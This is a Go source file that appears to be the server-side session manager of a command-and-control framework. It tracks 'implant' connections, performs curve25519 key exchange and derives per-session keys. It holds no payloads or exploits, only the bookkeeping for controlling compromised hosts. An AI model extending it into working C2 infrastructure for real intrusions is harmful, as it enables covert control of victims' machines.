package main

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"sync"
	"time"

	"golang.org/x/crypto/curve25519"
)

// SessionState tracks a single implant's connection
type SessionState struct {
	ID           [16]byte
	Hostname     string
	OS           string
	PublicKey    [32]byte
	SharedSecret [32]byte
	SessionKey   [32]byte
	SeqIn        uint64
	SeqOut       uint64
	FirstSeen    time.Time
	LastSeen     time.Time
	LastTaskID   uint64
	mu           sync.Mutex
}

// SessionManager tracks all active implant sessions
type SessionManager struct {
	mu       sync.RWMutex
	sessions map[string]*SessionState
	keys     *ServerKeys
}

func NewSessionManager(keys *ServerKeys) *SessionManager {
	return &SessionManager{
		sessions: make(map[string]*SessionState),
		keys:     keys,
	}
}

// Register completes key exchange and creates a new session
func (sm *SessionManager) Register(pubkey []byte, hostname, osName string) (*SessionState, error) {
	if len(pubkey) != KeySize {
		return nil, fmt.Errorf("invalid public key size: %d", len(pubkey))
	}

	var peerPub [32]byte
	copy(peerPub[:], pubkey)

	var shared [32]byte
	curve25519.ScalarMult(&shared, &sm.keys.Private, &peerPub)

	var sessionID [16]byte
	if _, err := io.ReadFull(rand.Reader, sessionID[:]); err != nil {
		return nil, fmt.Errorf("generate session id: %w", err)
	}

	h := sha256.New()
	h.Write(shared[:])
	h.Write(sessionID[:])
	var sessionKey [32]byte
	copy(sessionKey[:], h.Sum(nil))

	now := time.Now()
	s := &SessionState{
		ID:           sessionID,
		Hostname:     hostname,
		OS:           osName,
		PublicKey:    peerPub,
		SharedSecret: shared,
		SessionKey:   sessionKey,
		FirstSeen:    now,
		LastSeen:     now,
	}

	sm.mu.Lock()
	sm.sessions[fmt.Sprintf("%x", sessionID)] = s
	sm.mu.Unlock()

	return s, nil
}

// Get returns a session by hex ID
func (sm *SessionManager) Get(hexID string) *SessionState {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	return sm.sessions[hexID]
}

// List returns all active sessions
func (sm *SessionManager) List() []*SessionState {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	result := make([]*SessionState, 0, len(sm.sessions))
	for _, s := range sm.sessions {
		result = append(result, s)
	}
	return result
}

// Remove evicts a session
func (sm *SessionManager) Remove(hexID string) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	delete(sm.sessions, hexID)
}

// Touch updates LastSeen
func (s *SessionState) Touch() {
	s.mu.Lock()
	s.LastSeen = time.Now()
	s.mu.Unlock()
}
